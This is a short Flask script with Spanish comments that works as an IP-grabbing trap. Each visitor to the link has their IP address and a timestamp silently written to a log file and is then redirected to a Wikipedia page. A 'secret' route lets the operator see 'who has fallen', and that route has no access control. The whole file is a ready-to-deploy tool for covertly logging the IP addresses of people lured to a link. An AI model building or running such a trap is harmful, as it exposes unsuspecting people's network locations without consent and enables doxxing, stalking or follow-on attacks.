from flask import Flask, request, redirect
import datetime

app = Flask(__name__)

@app.route('/')
def logger():
    # 1. Intentamos obtener la IP de la cabecera de Render
    # 2. Si hay varias IPs (separadas por coma), agarramos la primera que es la del cliente
    ip_header = request.headers.get('X-Forwarded-For')
    
    if ip_header:
        ip_real = ip_header.split(',')[0].strip()
    else:
        # Si falla (por ejemplo, en pruebas locales), usamos la IP remota normal
        ip_real = request.remote_addr

    # Guardamos en el archivo
    with open("log.txt", "a") as f:
        import datetime
        f.write(f"Fecha: {datetime.datetime.now()} | IP Detectada: {ip_real}\n")
    
    return redirect("https://es.wikipedia.org/wiki/Dirección_IP")
    
@app.route('/ver-resultados')
def ver():
    # Ruta secreta para que tú veas quién ha caído
    try:
        with open("log.txt", "r") as f:
            return f"<pre>{f.read()}</pre>"
    except:
        return "Nadie ha entrado todavía."

if __name__ == "__main__":
    app.run()
